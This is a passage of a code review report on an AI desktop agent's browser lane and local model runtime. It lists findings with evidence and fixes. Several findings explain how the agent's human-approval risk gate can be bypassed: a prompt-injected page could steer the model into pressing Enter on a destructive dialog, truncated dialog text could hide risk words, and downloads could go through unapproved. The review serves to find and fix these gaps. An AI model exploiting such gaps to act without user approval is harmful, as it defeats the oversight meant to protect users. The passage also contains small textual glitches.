- **The shell runner is careful where it matters.** Own process group + `kill(-pid,
  SIGKILL)` on the timeout/kill-switch path, trip checks every 50 ms, per-stream 12 KB
  caps with an explicit "(output truncated)", a 0.5 s reader grace for a background
  child holding the pipe (`a_background_child_holding_the_pipe_does_not_hang`), and a
  `kills_kai` guard whose false positives are deliberate and tested against 26
  statements (`desktop.rs:298-356`).
- **Testability of platform code.** Extracting pure logic (`macos_roles`, `window::region`,
  `launch::linux::parse/best_match`, `input::parse_key`, the probe parsers) so it runs on
  every OS — plus the optional `tests/driver_matrix.rs` against real GTK/Qt/Firefox
  fixtures and the `examples/probe.rs` live instrument — is a better testing posture
  than most desktop agents have.

### Open questions

1. **`keyring` `linux-native`:** deliberate (a "no keychain daemon needed" call) or an
   oversight? If deliberate, README/DESIGN/`secrets.rs` must stop saying "OS keychain",
   and we need a plan for the reboot loss (users will file it as a bug).
2. **Multi-monitor:** is capturing only the primary display an accepted v1 limit? If
   yes, should onboarding say so (and should the corner gesture be defined relative to
   the captured display)?
3. **`open_app` arguments:** does any real task need `open_app("LibreOffice Writer
   --new")`-style arguments? If yes, OS-PER-01's fix needs an explicit, reviewed
   argument policy rather than "single token only".
4. **Kai's own window:** was the pid exclusion in `window::region` intended to cover the
   tree read as well (i.e. is OS-PER-06 a bug or a known gap)? If known, what is supposed
   to keep the model out of Kai's own approval buttons?
5. **Windows parity debt:** are field values (OS-PER-07), the GUI-shell fast path
   (OS-PER-02) and PowerShell encoding (OS-PER-08) deliberately deferred, or simply
   never done because CI on Windows is cross-compile-only?
6. **`KAI_WINDOW_SCOPE`:** off by default and undocumented in the README — is it still
   an intended feature (it changes the grounding coordinate space and the mask
   contract), or should it be removed to shrink the surface?

---

## 3.5 OS-WEB — Browser lane & local model runtime

*Reviewed files: 23. Findings: 1C / 3H / 13M / 10L / 4I.*

Reviewer scope: `crates/kai-os/src/web/` (11 files) and `crates/kai-os/src/local/` (7 files),
read in full, line by line, plus their integration tests in `crates/kai-os/tests/`
(`browser_edges.rs`, `browser_lane.rs`, `web_support/mod.rs`, `local_install.rs`,
`local_support/mod.rs`) and the helpers they depend on (`a11y::ground_indexed`,
`frame::downscale`, `marks::draw`, `kai_core::web::normalise_url`, `kai_core::risk`,
`kai_core::engine::act`, `kai-app/src/browser.rs`, `kai-app/src/local_api.rs`,
`kai-cli/src/runs.rs`, `kai-cli/src/models.rs`). Specs read: `README.md`,
`docs/BROWSER.md`, `docs/LOCAL_MODELS.md`; `DECISIONS.md` consulted for deliberate
deviations (marked "deliberate per DECISIONS" where relevant).

### Scope covered — checklist of every file read with line count + verdict

#### Browser lane (`crates/kai-os/src/web/`)

| File | Lines | Verdict |
|---|---|---|
| `mod.rs` | 17 | Thin module surface; re-exports are minimal and used. Good. |
| `cdp.rs` | 402 | Correct pipe setup, id pairing and per-session dialog tracking; blocking writes under a lock and SIGKILL-only teardown are the weak points. |
| `lane.rs` | 420 | Launch/discovery/args/tab handover are careful and well commented; missing profile-permission hardening, one misleading test name. |
| `snapshot.rs` | 340 | Clean two-call DOM+AX join with good unit tests; ragged-array indexing can panic, iframes deliberately unhandled. |
| `act.rs` | 497 | Solid action implementation with release guards and dialog handling; `Key` on a dialog bypasses the risk gate, insertText has no key events. |
| `look.rs` | 352 | Vision path (tree+snapshot+screenshot, retry on navigation race) is well factored; scaling/viewport assumptions documented. |
| `computer.rs` | 96 | Narrow, deliberately limited shared surface (move/scroll/wait); honest capability list. |
| `dialog.rs` | 217 | Dialog-as-marks is a genuinely good design with credit for testing risk escalation; truncation to 80 chars hides risk words. |
| `dropdown.rs` | 243 | Choose-by-label with in-page JS and mark lists under the box; no injection (label passed as argument), options capped. |
| `keys.rs` | 200 | Chord→CDP translation with `commands` for editing shortcuts; correct cross-platform select-all; reload/back/forward mapped deliberately. |
| `release.rs` | 142 | The release-on-cancel contract is right, but poisoning the *whole* lane (including reads) with no recovery path is a design flaw. |

#### Local runtime (`crates/kai-os/src/local/`)

| File | Lines | Verdict |
|---|---|---|
| `mod.rs` | 406 | Layout, install ordering and `.complete`-last are good; disk check arithmetic over-counts, no lock against concurrent installs. |
| `hub.rs` | 53 | Small, read-only Hub client; creates a fresh client per call, no body cap. |
| `disk.rs` | 66 | Correct statvfs/DXGI checks with a 1 GB margin; fine. |
| `download.rs` | 278 | Careful resumable downloader with streaming hash and retry budgets; no Content-Range validation, unverified pre-existing dest. |
| `hardware.rs` | 237 | Best-effort detection with unit tests; Linux GPU path loses the NVIDIA result if `/sys/class/drm` is missing. |
| `runtime.rs` | 357 | Pinned table with hashes/sizes, correct variant choice and safe unpacking; variant field only read by tests. |
| `server.rs` | 438 | Spawn args, health wait, log tail and pid checks are thoughtful; start kills any other instance's server, drags ownership into `server.json`, blocks the async runtime. |

### Verdict

**Browser lane.** The engineering quality here is high for an experimental lane: the
protocol client is a small, readable state machine over the debugging *pipe* (no port
to hijack), dialogs, tab handover, native dropdowns, file pickers and the crash/closed
browser cases are all handled and each has its own live-Chromium test in
`browser_edges.rs` — that is more than most production browser drivers ship. Against
that, there are two defects that matter: the risk gate the docs promise for page
dialogs is bypassed whenever the model answers with Enter/Esc instead of clicking the
(risk-worded) OK mark, and a *cancelled step* permanently poisons the lane including
reads, with no way back inside the app session — a direct consequence of the kill
switch being implemented as a `tokio::select!` that drops the action future. The
security baseline (Kai's own profile, pipe-only debug, address policy before every
navigation, page text as fenced data) is good; downloads being written to the user's
Downloads folder with no confirmation is the remaining hole in the "risky actions ask
first" story. Scores (1–10): **correctness 7** — the documented edge-case table is
actually implemented and tested, minus the poison trap and a ragged-snapshot panic;
**security 5** — pipe-only debug and a private profile are strong, but the Enter
dialog bypass, ungated downloads and a world-readable profile cap it; **maintainability
8** — one job per file, comments that point at the spec rows, a little long-function
pressure in `act.rs`; **test coverage 8** — real-browser tests for every documented
breakage, missing only poison/recovery, right-click/double-click and concurrent
proteins; **architecture fit 9** — a genuine `Perceptor` + `Actuator` with the prompt
and schema byte-identical to the desktop, exactly what DECISIONS.md argued for.

**Local runtime.** The model-store plumbing is the most mature part of this scope:
pinned URLs+sizes+SHA-256 for every archive, an idempotent install layout with a
`.complete` marker written last, a resumable downloader that hashes while streaming
and re-verifies resumed prefixes, a mock-HTTP + fake-`llama-server` test suite that
covers resume, cancel, checksum mismatch, unpacking, health wait, kill-on-drop and
detach, and clean loopback-only `llama-server` args with `--offline`. The weak seam is
*process lifecycle ownership*: `start()` stops any server on the machine (killing a
second instance's run), the app immediately detaches the handle so the documented
"killed when the app exits" is false, and `running()` deletes `server.json` when the
pid check fails, which can orphan a multi-GB server holding the port. The downloader
also assumes the server honoured the requested byte range (no `Content-Range` check)
and accepts a pre-existing file of the right size without hashing it, both narrower
than the "hash-checked" claims in the docs. Scores (1–10): **correctness 6** — install
and verification are solid, but supervision and concurrency have real bugs; **security
7** — pinned hashes, loopback-only, `--offline`, path-safe ids; minus an
unauthenticated local API and tolerant handling of hash-less entries; **maintainability
7** — clear data layout and docs, but sync-in-async, a dead helper and confusing
disk-space arithmetic; **test coverage 8** — excellent for downloads and server start/
stop, no tests for two instances, concurrency, Content-Range or permissions;
**architecture fit 8** — catalog/rank/runtime separation is clean and data-driven, the
state-file-as-handle design is the part that needs rework.

### Findings

#### [OS-WEB-01] Enter/Esc answers a destructive page dialog with no risk gate
- **Severity:** CRITICAL
- **Location:** `crates/kai-os/src/web/act.rs:257` (+`crates/kai-os/src/web/dialog.rs:48`, `crates/kai-core/src/risk.rs:120`)
- **What:** Clicking the `OK` mark of a `confirm("Delete all files?")` dialog is
  correctly high risk (the message is in the mark's name, and `dialog.rs` has a test
  proving it). But `act_on_dialog` also accepts a bare `key` decision with
  `["enter"]` (or `["esc"]`) and calls `answer(true/false)` directly. A key decision
  has no target, so `risk::classify`'s haystack is only the model's `thought` + `text`
  (`risk.rs:323-336`) — the page's message never enters it. A model (or a
  prompt-injected page talking the model into a single keypress) can therefore accept
  "Delete all 12 files?" or answer a `beforeunload` (discard changes) with
  `"risk":"none"` and no approval at all, even on `HighRiskOnly` or Autopilot. That is
  the exact promise `docs/BROWSER.md:64` makes ("answering 'Delete all files?' is high
  risk whatever the model says") and `DECISIONS.md:646-650` relies on ("the existing
  risk words decide approval").
- **Evidence:**
  ```rust
  (Action::Key, _) if d.keys == ["enter"] => self.answer(true).await,
  (Action::Key, _) if d.keys == ["esc"] => self.answer(false).await,
  ```
  (nothing in the path consults `risk` or the dialog message; `browser_edges.rs:97`
  shows Enter on a dialog is reachable and expected)
- **Impact:** Every user of the lane: a destructive `confirm()`/`beforeunload` can be
  committed with zero approval, silently; the safety story for the lane is broken.
- **Fix:** In `act_on_dialog` (`web/act.rs`), before `self.answer(true)`, synthesise
  the equivalent accept decision and classify it against the dialog's own marks:
  build `Grounding::Marks` from `self.last_dialog` (already stored) and run
  `kai_core::risk::classify(&accept_decision, &marks)`; if the result is `High`,
  return an error like "that dialog is high risk: click its OK mark so the user can
  approve it" (the click path already escalates). Cover `beforeunload` too. Add a
  regression test next to `destructive_answers_are_high_risk_whatever_the_model_says`
  (`web/dialog.rs:178`) that a `key: ["enter"]` decision on a confirm containing
  "delete" is refused/high-risk, and an integration assertion in `browser_edges.rs`.

#### [OS-WEB-02] A cancelled step poisons Kai's browser lane for the rest of the app session
- **Severity:** HIGH
- **Location:** `crates/kai-os/src/web/release.rs:69` (+`crates/kai-os/src/web/lane.rs:196`, `crates/kai-app/src/browser.rs:21`, `crates/kai-core/src/engine/act.rs:153`)
- **What:** `Release::drop` sets `input_poisoned = true` and sends the cleanup event
  whenever an input future is dropped mid-await. The engine wraps every action in
  `tokio::select! { cancelled => ..., operation => ... }`; pressing Stop / Ctrl+Alt+Esc /
  the corner (`RunControl::stop → Interrupt::cancelled`) drops the operation future
  while a click or key is in flight. From then on `BrowserLane::page()` fails for
  **every** call — including `Accessibility.getFullAXTree`, `Page.captureScreenshot`
  and `Page.getLayoutMetrics`, i.e. observation too — with "browser input cleanup was
  not acknowledged; restart the browser". The app's `Lanes::get` reuses any lane whose
  process is alive, so the next run in the same session is dead on arrival until the
  user manually closes the browser window (the only thing that makes `is_open()` false).
- **Evidence:**
  ```rust
  // release.rs:69-77
  if self.armed { self.poisoned.store(true, Ordering::SeqCst); ... }
  // lane.rs:196-199
  anyhow::ensure!(!self.input_poisoned.load(Ordering::SeqCst),
      "browser input cleanup was not acknowledged; restart the browser");
  // kai-app/src/browser.rs:21
  if let Some(lane) = slot.as_ref().filter(|l| l.is_open()) { return Ok(lane.clone()); }
  ```
- **Impact:** Any user who stops a run during a click/key loses the browser lane for
  the whole app session, with an error the UI cannot act on; "stop and retry" — the
  most common flow — is broken for the experimental feature the README headlines.
- **Fix:** (a) Make the cleanup write acked: have `Cdp::send_cleanup` return
  `Result<()>` and only poison when the write *failed* (or when the session is gone —
  in both cases the browser is already unusable, so poisoning is moot). If the release
  was written into the pipe, the protocol guarantees ordering, so the lane is
  consistent and can be reused. (b) Keep poisoning for the truly unknown state, but
  give the lane a recovery path: expose `BrowserLane::is_poisoned()` and either reset
  the flag after a successful `Input.dispatchKeyEvent`-free probe, or have
  `kai-app/src/browser.rs::Lanes::get` drop and relaunch the lane when it is poisoned
  (same code path as `!is_open()`). (c) Add a test: launch a headless lane, wrap
  `act(click)` in a `select!` that takes the cancel branch mid-flight, then assert the
  next `observe()` succeeds (today it fails) — put it in `tests/browser_edges.rs`.

#### [OS-WEB-03] Page-triggered downloads land silently in the user's Downloads folder, outside the risk gate
- **Severity:** HIGH
- **Location:** `crates/kai-os/src/web/lane.rs:145` (+`crates/kai-os/src/web/act.rs:118`)
- **What:** The lane calls `Browser.setDownloadBehavior {"behavior":"allow",
  "downloadPath": <~/Downloads>}` at launch. From then on any navigator-initiated
  download — a link the model clicks, a JS `location = file`, a site that fires
  downloads on page load, or a hostile page that opens three of them — is written into
  the user's real Downloads folder with no prompt, no dialog and no entry in Kai's
  risk/approval path. The click that caused it is judged by `risk::classify`, which
  knows nothing about a download being about to start. On the desktop lane the same
  click inherits the user's browser download UI (prompt/save-as/shelf), so the lane is
  strictly *less* supervised than the desktop here. `docs/BROWSER.md:70` documents the
  destination but not the absence of approval.
- **Evidence:**
  ```rust
  cdp.call("Browser.setDownloadBehavior",
           json!({"behavior": "allow", "downloadPath": dir}), None)
  ```
  (and no `Browser.downloadWillBegin` listener anywhere in `src/web/`)
- **Impact:** A page Kai visits can put arbitrary files (often `.dmg`/`.exe` installers,
  "invoice.html") in the user's Downloads with Kai as the apparent author; malware
  delivery and privacy put at risk without a single approval.
- **Fix:** Enable `Browser.downloadWillBegin`/`downloadProgress` (add them to
  `KEPT_EVENTS`), and either set `behavior:"deny"` by default and turn the click into
  an `ask_user` ("this opened a download of `x.dmg` — allow it into ~/Downloads?"), or
  download into a Kai-owned directory (`<root>/downloads`) with `allowAndName`, then
  surface the path and a risk-gated "deliver to Downloads" step. At minimum make a
  download an event the engine sees before the file is written. Tests: extend
  `file_pickers_are_reported_and_downloads_land_in_the_folder`
  (`tests/browser_edges.rs:236`) to assert the download is *announced* (a bail or a
  synthetic decision) rather than silently written.

#### [OS-WEB-04] Starting a model server kills any other Kai instance's server, and a stale handle can delete the new server's state file
- **Severity:** HIGH
- **Location:** `crates/kai-os/src/local/server.rs:206` (+`crates/kai-os/src/local/server.rs:79`, `crates/kai-cli/src/models.rs:254`)
- **What:** `LocalManager::start` begins with `let _ = self.stop();` — it stops
  *whatever* server is recorded in `server.json`, regardless of who started it. Two
  Kai processes (app + `kai run --backend local`, two CLI runs, a bench) therefore
  fight: the second kills the first's server mid-run, and the first's next
  `/v1/chat/completions` fails with a connection error. Worse, ownership of
  `server.json` is not checked on teardown: if handle A detaches/was superseded and
  handle B wrote a new `server.json`, A's `Drop` still `remove_file`s the path
  (`server.rs:79-85`), so `kai models stop`/`status()` can no longer find B — an
  unmanaged `llama-server` (4–25 GB RSS) keeps running and holding the port.
- **Evidence:**
  ```rust
  // server.rs:206
  let _ = self.stop();          // stops any server, not just the caller's
  // server.rs:82-84 (Drop)
  let _ = c.start_kill();
  let _ = std::fs::remove_file(&self.state);   // not checked against self.pid
  ```
- **Impact:** Two plausible concurrent Kai processes break each other's runs and can
  leave an unstoppable orphan model server; the user sees "port in use" or a dead
  model mid-task with no obvious cause.
- **Fix:** (1) `start` should only stop the recorded server when its `id != entry.id`
  *and* the caller asked for that, or when `status()` is unhealthy; otherwise return
  "a server for X is already running; stop it first" (mirror the reuse logic already
  in `kai-cli/src/models.rs:263-268`). (2) Guard `server.json` with an exclusive
  `flock` on `<root>/server.lock` held for the life of the handle; on `Drop`, re-read
  the file and remove it only if `pid == self.pid`. (3) Add a test in
  `tests/local_install.rs` that starts two managers on one root with fake runtimes and
  asserts the second does not kill the first's healthy same-model server and that a
  dropped stale handle leaves the current state file intact.

#### [OS-WEB-05] Dialog risk words past 80 characters never reach the risk engine
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/web/dialog.rs:29`
- **What:** `message()` truncates the page's dialog text to 80 chars (plus `…`) before
  it is pasted into the accept button's name — the only channel the risk engine scans.
  A page (or a compromised/looked-alike site) can put 80 harmless characters first and
  the destructive verb later ("Your session has expired. Click OK to continue. …
  This will delete every file in your account."). The click is then `Risk::None`, no
  approval. This is a *risk-gate* weakening, not just a display nicety, and it
  compounds OS-WEB-01.
- **Evidence:**
  ```rust
  if m.chars().count() > 80 { let short: String = m.chars().take(80).collect(); format!("{short}…") }
  // later: said(label) -> format!("{label} (page dialog: \"{msg}\")")
  ```
- **Impact:** Confirmation dialogs whose operative verb sits after the cut are
  clickable without approval on any approval level below "Every".
- **Fix:** Keep the full message for the risk scan and truncate only for display. The
  simplest robust shape is head+tail: take the first ~60 and the last ~60 characters,
  joined with `…` (the operative verb is almost always near one end), and add a
  `dialog.rs` unit test with a risk word only at character 200 asserting
  `risk::classify` still returns `High` for the accept mark. Longer-term, expose the
  dialog message as structured data on the observation (e.g. `Observation::notes`)
  and classify it in `kai-core` before the actuator runs.

#### [OS-WEB-06] A strict pid check makes `running()` forget a live server, orphaning it
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/local/server.rs:281` (+`crates/kai-os/src/local/server.rs:310`, `crates/kai-os/src/local/server.rs:324`)
- **What:** `running()` only believes `server.json` if `pid_is_server()` re-finds the
  `--alias` and `--port` flags in `/proc/<pid>/cmdline` (Linux) or in `ps` output
  (macOS). A server started by an older/newer Kai with different flags, by a user's own
  `llama-server` invocation, or on a system where `/proc` or `ps` is unavailable, fails
  the check — and then `running()` *deletes* the state file. The process keeps its port
  and its RAM; `kai models stop` reports "No local model server is running", and the
  next `start` spends 15 s in `wait_for_port` before failing with "port in use".
- **Evidence:**
  ```rust
  if pid_is_server(&info) { Some(info) } else {
      let _ = std::fs::remove_file(self.state_path());
      None
  }
  ```
- **Impact:** Users of older/newer builds or unusual containers get an unkillable
  orphan and a confusing port error; on macOS the same happens if `ps` cannot be
  spawned.
- **Fix:** Separate "liveness" from "identity": treat a pid as live when
  `kill(pid, 0)` succeeds (or `tasklist` shows it) and use the flags only as a
  tie-breaker for *recycling* risk; never delete `server.json` merely because the
  command line could not be read. Additionally record a random per-start token as a
  CLI arg (`--kai-run-id <uuid>`, harmless to llama-server) and require it in the
  check. Add tests for: a stale pid whose command line is unreadable (state survives),
  and a recycled pid (state is dropped).

#### [OS-WEB-07] The app detaches the model server, so docs/LOCAL_MODELS.md's "killed when the app exits" is false
- **Severity:** MEDIUM (documentation conflict)
- **Location:** `crates/kai-app/src/local_api.rs:91` (contradicting `docs/LOCAL_MODELS.md:304-307`)
- **What:** `kai-app`'s `LocalManager::start` calls `server.detach()` immediately, so
  nothing in the app owns the child: quitting the app (or crashing it) leaves the
  4–25 GB `llama-server` running until `kai models stop` or the Models page's Stop is
  used. The doc says the opposite: "Kai stops the server when the app exits (its handle
  kills the process on drop). `kai models start --detach` leaves it running until
  `kai models stop`." A reader (or an exit handler writer) will trust the doc.
- **Evidence:**
  ```rust
  pub async fn start(&self, entry: &ModelEntry, port: u16) -> anyhow::Result<LocalServer> {
      let server = self.inner.start(entry, port).await?;
      let out = LocalServer { base_url: server.base_url.clone(), pid: server.pid };
      server.detach();           // ← no owner left
      Ok(out)
  }
  ```
- **Impact:** App users silently keep a multi-GB model in RAM/VRAM and a bound port
  after quitting; laptops on battery and 16 GB machines lose a large fraction of
  memory to a process the user believes is gone.
- **Fix:** Pick one behaviour and align code+docs. Preferred: keep the app's
  `LocalServer` handle (drop `detach()`), and keep the process alive across runs by
  holding it in app state, killing it in the app's shutdown path (and let
  `Lanes`-style reuse + `kai models stop` handle the leftover cases). If detach is
  wanted (server survives so the next session reuses it), then update
  `docs/LOCAL_MODELS.md` and add an app-exit sweep that stops a server recorded in
  `server.json` when it was started by the app (mark it in the info struct).

#### [OS-WEB-08] Resume honours HTTP 206 without checking where the range starts
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/local/download.rs:151`
- **What:** On resume the code accepts any `206` as "the bytes continue from `have`"
  and appends them. A proxy, CDN node, or a server that answers `Range: bytes=N-`
  with a different window (a real failure mode behind corporate TLS-inspecting
  proxies, which DECISIONS.md says this project supports) silently produces a `.part`
  whose prefix and suffix come from different offsets. If the entry has a `sha256`
  (catalog and hub entries do), the final check catches it but only after the whole
  ~19 GB is re-downloaded; if the entry has no `sha256` (`ModelEntry::problems()` does
  not require one, `download.rs:285` reports "no checksum published"), the corrupt file
  is renamed into place and only llama-server's failure (or nothing) reveals it.
- **Evidence:**
  ```rust
  match status { 206 => {}            // no Content-Range parsed
                200 => { /* reset */ } 416 => { /* ... */ } ... }
  ```
- **Impact:** Silent model corruption for hash-less entries; wasted multi-GB downloads
  otherwise. The existing mock server tests range handling but never an off-by-N
  `Content-Range`.
- **Fix:** Parse `Content-Range: bytes a-b/total` on 206 and restart from zero when
  `a != have` (the `200` branch already does exactly that); assert `b+1-a` equals the
  bytes read when the body ends. Extend `tests/local_support/mod.rs` with a
  `lying_range: bool` route that answers 206 from offset 0 and add a test asserting
  the file still verifies (restart) rather than corrupting.

#### [OS-WEB-09] Concurrent installs share one `.part` file and race the runtime folder swap
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/local/mod.rs:268` (+`crates/kai-os/src/local/mod.rs:355`)
- **What:** Nothing serialises `install()`: app + CLI (or two CLI invocations) both
  open the same `<file>.gguf.part`, `set_len(have)`, seek and write — two independent
  positions in one file, producing a file whose tail overwrites the other's data. The
  final hash catches it (when present) but the error message blames a "checksum
  mismatch", and the file is deleted, wasting both downloads. `install_runtime` is
  worse: `remove_dir_all(&final_dir)` followed by `rename(&tmp, &final_dir)` between
  two processes can delete the folder a `llama-server` from the other process is
  about to exec, or leave `current.json` pointing at a half-swapped tree.
- **Evidence:**
  ```rust
  // mod.rs:355-358 (runtime swap, no lock)
  if final_dir.exists() { std::fs::remove_dir_all(&final_dir)?; }
  std::fs::rename(&tmp, &final_dir)?;
  ```
- **Impact:** Users who press Install in the app and run `kai models install` in a
  terminal (or a bench) get corrupted/interrupted downloads and confusing errors.
- **Fix:** Take an exclusive advisory lock for the whole install
  (`fs2::FileExt::try_lock_exclusive` on `<root>/.install.lock`, or an O_EXCL lockfile
  with the pid) at the top of `LocalManager::install`; on contention return a friendly
  "another Kai is already installing; wait or cancel it". Do the same around
  `install_runtime`. Add a test that two concurrent `install`s of the same entry on one
  root either serialise (second waits) or fail cleanly, and that the resulting file
  verifies.

#### [OS-WEB-10] Blocking work inside async: 5-second SIGTERM wait, sync fs and process spawns
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/local/server.rs:341` (+`crates/kai-os/src/local/server.rs:278`, `crates/kai-os/src/local/server.rs:180`)
- **What:** `kill_pid` (unix) sleeps up to 5 s (`for _ in 0..50 { sleep(100ms) }`) and is
  called from the async `start()` path and from `LocalManager::stop()` (used by
  `kai run --backend local`, `kai models stop`, the app's Stop button). `running()`
  performs blocking file reads, `tail()` reads the whole log synchronously, and
  `pid_is_server` spawns `ps`/`tasklist` — all on the async runtime's worker threads.
  With the app's multi-thread runtime this occupies a worker for seconds and can stall
  unrelated tasks (browser lane calls, UI polling of `status()`), and in a single-且
  thread runtime (tests, some CLI paths) it blocks everything.
- **Evidence:**
  ```rust
  for _ in 0..50 { std::thread::sleep(Duration::from_millis(100));
                   if unsafe { libc::kill(pid, 0) } != 0 { return; } }
  unsafe { libc::kill(pid, libc::SIGKILL) };
  ```
- **Impact:** UI/agent stalls and spurious timeouts whenever a server is stopped or
  its status polled — worst exactly on the slow machines the local path targets.
- **Fix:** Make `kill_pid` async (`tokio::time::sleep`, `tokio::process`) or run it in
  `spawn_blocking`; wrap `running()`, `tail()` and `pid_is_server` in
  `tokio::task::spawn_blocking` from their async callers (keep the sync cores for
  tests). Add a test asserting `start()`/`stop()` do not block a concurrent tokio timer
  by more than ~100 ms.

#### [OS-WEB-11] CDP calls and cleanup writes can block forever on the writer mutex
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/web/cdp.rs:93` (+`crates/kai-os/src/web/cdp.rs:186`)
- **What:** Both the normal path and the cancel-cleanup path write to the browser pipe
  with a blocking `std::fs::File::write_all` while holding `writer: Mutex<File>`. If
  the browser process is alive but not draining its fd 3 (a wedged renderer/browser,
  or a very large backlog of events), the 64 KiB pipe buffer fills and the write
  blocks *holding the mutex* on a runtime worker thread; every other lane call then
  queues behind the mutex forever, because there is no timeout on the write and the
  `CALL_TIMEOUT` only covers the read/await side. `send_cleanup` (called from `Drop`,
  i.e. also from cancel paths) has the same shape and cannot even report failure.
- **Evidence:**
  ```rust
  self.writer.lock()...?.write_all(&bytes)?;   // send_cleanup, ignores the result
  // call_within: .and_then(|mut w| w.write_all(&bytes).map_err(Into::into));
  ```
- **Impact:** A single unresponsive browser can hang the whole agent runtime (all
  lane calls, and any other tasks scheduled on that worker), even though the lane
  promises per-call timeouts. Recovery requires killing the app.
- **Fix:** Move the writer to a dedicated thread (or use `tokio::task::spawn_blocking`
  plus a `tokio::sync::Mutex`), set `O_NONBLOCK` on the write end and treat `EAGAIN` as
  a dropped-call error after a short bounded retry, and make `send_cleanup` return
  `Result<()>` so the release path can report/poison deliberately (see OS-WEB-02).
  Add a test with a fake reader that never drains to prove calls fail within
  `CALL_TIMEOUT` rather than hanging.

#### [OS-WEB-12] `snapshot::layout` can panic on a ragged DOM snapshot
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/web/snapshot.rs:80`
- **What:** The layout join iterates `layout.nodeIndex` and indexes `bounds[i]` (and
  `styles[i]`) by the enumerate position without checking lengths, while `backend`,
  `index` and `bounds` are each extracted independently. Chrome always emits these
  arrays in lockstep today, but the module's own contract (and its test
  `garbage_yields_nothing_rather_than_panicking`) is that malformed protocol JSON must
  not panic; an old/new Chrome, a debugger-adjacent tool, or a partially truncated
  message would abort the observation task (and in the CLI, the run) with an
  index-out-of-bounds panic instead of degrading to the grid.
- **Evidence:**
  ```rust
  let b = &bounds[i];                       // bounds may be shorter than nodeIndex
  let rect = Rect::new(f(&b[0]), f(&b[1]), f(&b[2]), f(&b[3]));
  ```
- **Impact:** Observation panic (run failure) on any Chrome version or snapshot shape
  the reviewer has not seen; the rest of the module is carefully total, so this stands
  out.
- **Fix:** Use `let Some(b) = bounds.get(i)` / `styles.get(i)` with `continue`, and
  require `b.len() >= 4`. Extend the `garbage_yields_nothing_rather_than_panicking`
  test with a fixture where `nodeIndex` has more entries than `bounds`, and one where
  a bounds entry has 2 numbers.

#### [OS-WEB-13] Iframes are invisible: no marks, no text, grid fallback only
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/web/snapshot.rs:52` (+`docs/BROWSER.md:160`)
- **What:** `layout()` reads `documents[0]` only. Elements inside same-origin iframes
  live in `documents[1..]` (with their own `frameId`), so they have no layout box and
  are dropped by `snapshot::nodes` — the model sees no marks for them and falls back
  to coordinates on a grid, which the AX tree cannot help it target. This is declared
  "Not built yet" in the docs, but it is the largest functional gap for real web tasks
  (payment forms, embedded editors, many login flows) and is the main reason a user
  would fall back to the desktop lane.
- **Evidence:**
  ```rust
  let doc = &snapshot["documents"][0];      // other frames never looked at
  ```
- **Impact:** Whole classes of pages are unusable/erratic through the lane; the
  head-to-head numbers in the README are measured on fixture pages without frames.
- **Fix:** Iterate every document in the snapshot, join each on its own
  `backendNodeId` space (they are global), and offset/scroll each document's bounds by
  its frame's viewport origin (available from the frame tree via
  `Page.getFrameTree` + `Page.getLayoutMetrics`, or by also snapshotting each frame's
  document with `DOMSnapshot.captureSnapshot`'s `frameId` param). Then merge into one
  `nodes()` list before `ground_indexed`; keep `DomRef` per node, which already carries
  the backend id needed for `DOM.scrollIntoViewIfNeeded` inside frames. Add fixture
  pages with one same-origin and one cross-origin iframe to `browser_edges.rs`.

#### [OS-WEB-14] `health()` builds a fresh HTTP client every 250 ms for up to 10 minutes
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/local/server.rs:176` (+`crates/kai-os/src/local/server.rs:263`)
- **What:** Each health poll constructs a new `reqwest::Client` (a connector, DNS
  resolver and pool), then drops it. A 19 GB model on a slow disk loads for minutes:
  at 4 polls/s that is ~2,400 clients, each opening and closing a TCP connection to
  `127.0.0.1`, plus the allocations. `status()` and `kai doctor` do the same on every
  call, and `kai-app` polls status.
- **Evidence:**
  ```rust
  pub async fn health(port: u16) -> bool {
      let url = format!("http://127.0.0.1:{port}/health");
      matches!(local_http().get(url).send().await, ...)   // local_http() = new Client
  ```
- **Impact:** Wasted CPU/FDs during every model start and status poll, on exactly the
  low-end machines the local backend targets; slower readiness detection under load.
- **Fix:** Build one client per `start()` (or a `OnceLock` static) and reuse it; the
  `no_proxy` + 3 s timeout settings belong to that one client. Make `health` take
  `&reqwest::Client`. No test needed beyond the existing fake-server start test.

#### [OS-WEB-15] Linux GPU detection throws away the NVIDIA result when `/sys/class/drm` is unreadable
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/local/hardware.rs:104`
- **What:** `gpu()` computes the NVIDIA result first, then does
  `let amd = std::fs::read_dir("/sys/class/drm").ok()?;`. The `?` returns `None` from
  the whole function when that directory cannot be read, discarding a perfectly good
  `nvidia-smi` answer. This mis-detects the machine as GPU-less: `runtime::choose_variant`
  picks the CPU build (no Vulkan/CUDA offload, 10–100× slower) and `rank()` downgrades
  every model tier. Containers and hardened systems with a minimal `/sys` are exactly
  where Kai's local path and CI benches run.
- **Evidence:**
  ```rust
  let nvidia = run_quick("nvidia-smi", ...).and_then(|o| parse_nvidia_smi(&o));
  let amd = std::fs::read_dir("/sys/class/drm").ok()?;   // discards `nvidia` on failure
  ```
- **Impact:** Users on such systems get the CPU build and wrong recommendations with no
  warning.
- **Fix:** `let amd = std::fs::read_dir("/sys/class/drm").ok().into_iter().flatten()...`
  so only the AMD branch is skipped. Add a unit test by factoring the merge into a
  helper that takes two `Option`s (or by injecting the drm path).

#### [OS-WEB-16] Disk-space check double-counts the runtime and can refuse a fitting install
- **Severity:** MEDIUM
- **Location:** `crates/kai-os/src/local/mod.rs:234`
- **What:** `bytes_to_download()` already adds `spec.total_bytes()` when the runtime is
  missing (mod.rs:202-206), and the caller then adds `spec.total_bytes() * 2` again.
  Peak usage is archive + unpacked + model = `bytes_to_download + total_bytes`, so the
  check demands one extra runtime's worth (11 MB–650 MB, much more for the CUDA
  archives) more free space than needed. On a machine that would fit the install, Kai
  refuses with "not enough disk space: this needs X GB (plus 1 GB to spare)" — a
  false refusal with a misleading number. On marginally fitting machines, the install
  is blocked even though the unpack deletes the archive afterwards.
- **Evidence:**
  ```rust
  let needed = self.bytes_to_download(entry)?
      + if need_runtime { spec.total_bytes() * 2 } else { 0 };
  ```
